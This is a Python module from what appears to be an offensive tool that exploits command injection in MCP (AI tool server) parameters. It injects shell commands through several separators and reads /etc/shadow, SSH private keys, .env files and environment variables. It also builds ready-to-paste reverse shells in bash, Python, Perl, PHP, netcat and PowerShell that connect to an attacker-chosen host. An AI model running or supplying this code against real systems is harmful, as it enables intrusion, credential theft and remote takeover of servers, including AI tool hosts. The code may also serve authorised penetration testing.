"""Command injection exploiter — post-confirmation exploitation of confirmed CMDi in MCP tools."""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..client import MCPClient

# Marker echoed back to confirm command execution without relying on system state.
_CMD_MARKER = "MCPRAY_CMDI_7z9x"

# (technique_name, separator_template) — {cmd} is replaced with the command to run.
# base_value precedes the separator so the original tool behaviour is preserved.
_TECHNIQUES: list[tuple[str, str]] = [
    ("semicolon", "; {cmd}"),
    ("pipe", "| {cmd}"),
    ("backtick", "`{cmd}`"),
    ("subshell", "$({cmd})"),
    ("newline", "\n{cmd}"),
    ("or", "|| {cmd}"),
]

# Indicators that a command executed (typical command output / username chars).
_USERNAME_RE = re.compile(r"^[a-z_][a-z0-9_-]{0,31}$", re.IGNORECASE)

# Linux /etc/passwd-style id output, e.g. uid=0(root) gid=0(root)
_ID_RE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")

# Files worth grabbing on a confirmed CMDi.
_LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/root/.ssh/id_rsa",
    "~/.ssh/id_rsa",
    "/etc/hostname",
]
_WINDOWS_FILES = [
    r"C:\Windows\win.ini",
    r"C:\Windows\System32\drivers\etc\hosts",
]


@dataclass
class CmdInjResult:
    tool_name: str
    param: str
    confirmed: bool = False
    technique: str = ""      # "semicolon", "pipe", "backtick", "subshell", "newline"
    os_type: str = ""        # "linux", "windows", "unknown"
    whoami: str = ""
    hostname: str = ""
    id_output: str = ""
    env_vars: dict[str, str] = field(default_factory=dict)
    interesting_files: dict[str, str] = field(default_factory=dict)  # path -> content
    reverse_shells: list[str] = field(default_factory=list)   # ready-to-use payloads
    error: str = ""


class CmdInjExploiter:
    """Exploits a confirmed (or suspected) command injection in an MCP tool parameter."""

    def __init__(self, client: MCPClient):
        self.client = client

    # ── Low-level injection ──────────────────────────────────────────────────────

    def _build_payload(self, cmd: str, technique: str, base_value: str) -> str:
        for name, tmpl in _TECHNIQUES:
            if name == technique:
                return f"{base_value}{tmpl.format(cmd=cmd)}"
        # Unknown technique — default to semicolon
        return f"{base_value}; {cmd}"

    async def _inject(
        self,
        tool_name: str,
        param: str,
        cmd: str,
        technique: str,
        base_value: str = "test",
    ) -> str:
        """Inject cmd via the given technique, call the tool, return joined content."""
        payload = self._build_payload(cmd, technique, base_value)
        result = await self.client.call_tool(tool_name, {param: payload})
        if not result.get("success"):
            return ""
        content = result.get("content", []) or []
        return "\n".join(str(c) for c in content).strip()

    # ── Detection ────────────────────────────────────────────────────────────────

    async def confirm(
        self, tool_name: str, param: str, base_value: str = "test"
    ) -> tuple[bool, str]:
        """Try each technique with an echo marker. Return (confirmed, technique)."""
        marker_cmd = f"echo {_CMD_MARKER}"
        for name, _tmpl in _TECHNIQUES:
            out = await self._inject(tool_name, param, marker_cmd, name, base_value)
            if out and _CMD_MARKER in out:
                return True, name

        # Fallback: run whoami and look for username-like / id-like output.
        for name, _tmpl in _TECHNIQUES:
            out = await self._inject(tool_name, param, "whoami", name, base_value)
            if not out:
                continue
            candidate = out.strip().splitlines()[-1].strip()
            # Strip echoed base_value if it leaks into the line.
            candidate = candidate.replace(base_value, "").strip()
            if candidate and _USERNAME_RE.match(candidate):
                return True, name
            if _ID_RE.search(out):
                return True, name

        return False, ""

    async def detect_os(self, tool_name: str, param: str, technique: str) -> str:
        """Run `uname -s` (linux) vs `ver` (windows) to detect the OS."""
        uname = await self._inject(tool_name, param, "uname -s", technique)
        if uname:
            low = uname.lower()
            if "linux" in low:
                return "linux"
            if "darwin" in low or "bsd" in low:
                return "linux"  # POSIX shell semantics — treat like linux

        ver = await self._inject(tool_name, param, "ver", technique)
        if ver and "windows" in ver.lower():
            return "windows"

        # Secondary windows tell: %OS% / echo of cmd.exe builtins
        whoami = await self._inject(tool_name, param, "whoami", technique)
        if whoami and "\\" in whoami:
            return "windows"

        return "unknown"

    # ── Command execution ────────────────────────────────────────────────────────

    async def run_cmd(
        self,
        tool_name: str,
        param: str,
        technique: str,
        cmd: str,
        base_value: str = "test",
    ) -> str:
        """Inject and run an arbitrary command using the confirmed technique."""
        return await self._inject(tool_name, param, cmd, technique, base_value)

    # ── Enumeration ──────────────────────────────────────────────────────────────

    async def enumerate(
        self, tool_name: str, param: str, technique: str, os_type: str
    ) -> dict:
        """Run a battery of recon commands. Return {command: output}."""
        results: dict[str, str] = {}

        if os_type == "windows":
            cmds = [
                "whoami",
                "hostname",
                "set",
                r"type C:\Windows\win.ini",
                "ipconfig /all",
                "net user",
            ]
        else:
            cmds = [
                "whoami",
                "id",
                "hostname",
                "env",
                "cat /etc/passwd",
                "cat /etc/shadow",
                "cat ~/.ssh/id_rsa",
                'find / -name "*.env" -maxdepth 4 2>/dev/null | head',
            ]

        for cmd in cmds:
            out = await self.run_cmd(tool_name, param, technique, cmd)
            if out:
                results[cmd] = out
        return results

    # ── Reverse shells ───────────────────────────────────────────────────────────

    async def generate_reverse_shells(
        self, lhost: str, lport: int, os_type: str, technique: str
    ) -> list[str]:
        """Return ready-to-paste reverse shell payloads (separator + one-liner)."""
        sep = next((tmpl for name, tmpl in _TECHNIQUES if name == technique), "; {cmd}")

        def wrap(cmd: str) -> str:
            # Reuse the technique separator; base_value omitted so user can prepend.
            return sep.format(cmd=cmd)

        shells: list[str] = []

        if os_type == "windows":
            ps = (
                "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient("
                f"'{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
                "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                "$sl=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sl,0,$sl.Length);"
                "$s.Flush()}\""
            )
            shells.append("# PowerShell TCP reverse shell\n" + wrap(ps))
            ncat = f"ncat {lhost} {lport} -e cmd.exe"
            shells.append("# ncat (cmd.exe)\n" + wrap(ncat))
            return shells

        # ── POSIX / Linux ──
        bash = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        shells.append("# bash -i TCP reverse shell\n" + wrap(f"bash -c '{bash}'"))

        py = (
            "python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "import pty;pty.spawn(\"/bin/sh\")'"
        )
        shells.append("# python3 socket reverse shell\n" + wrap(py))

        ncat = f"ncat {lhost} {lport} -e /bin/sh"
        shells.append("# ncat reverse shell\n" + wrap(ncat))

        nc_mkfifo = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        shells.append("# nc mkfifo reverse shell (no -e)\n" + wrap(nc_mkfifo))

        perl = (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        )
        shells.append("# perl reverse shell\n" + wrap(perl))

        php = (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
        shells.append("# php reverse shell\n" + wrap(php))

        return shells

    # ── Main entry point ─────────────────────────────────────────────────────────

    async def run(
        self,
        tool_name: str,
        param: str,
        base_value: str = "test",
        enumerate_system: bool = True,
        lhost: str = "",
        lport: int = 4444,
    ) -> CmdInjResult:
        result = CmdInjResult(tool_name=tool_name, param=param)

        try:
            confirmed, technique = await self.confirm(tool_name, param, base_value)
        except Exception as e:  # noqa: BLE001
            result.error = f"confirm failed: {e}"
            return result

        if not confirmed:
            result.error = "Command injection could not be confirmed"
            return result

        result.confirmed = True
        result.technique = technique

        result.os_type = await self.detect_os(tool_name, param, technique)

        if enumerate_system:
            enum = await self.enumerate(tool_name, param, technique, result.os_type)

            result.whoami = enum.get("whoami", "").strip()
            result.hostname = enum.get("hostname", "").strip()
            result.id_output = enum.get("id", "").strip()

            # Environment variables (env / set output) → dict.
            env_raw = enum.get("env") or enum.get("set") or ""
            for line in env_raw.splitlines():
                if "=" in line:
                    k, _, v = line.partition("=")
                    k = k.strip()
                    if k:
                        result.env_vars[k] = v.strip()

            # Map known file-read commands into interesting_files.
            file_cmds = {
                "cat /etc/passwd": "/etc/passwd",
                "cat /etc/shadow": "/etc/shadow",
                "cat ~/.ssh/id_rsa": "~/.ssh/id_rsa",
                'find / -name "*.env" -maxdepth 4 2>/dev/null | head': "*.env (search)",
                r"type C:\Windows\win.ini": r"C:\Windows\win.ini",
            }
            for cmd, path in file_cmds.items():
                if cmd in enum and enum[cmd].strip():
                    result.interesting_files[path] = enum[cmd]

        if lhost:
            result.reverse_shells = await self.generate_reverse_shells(
                lhost, lport, result.os_type or "linux", technique
            )

        return result
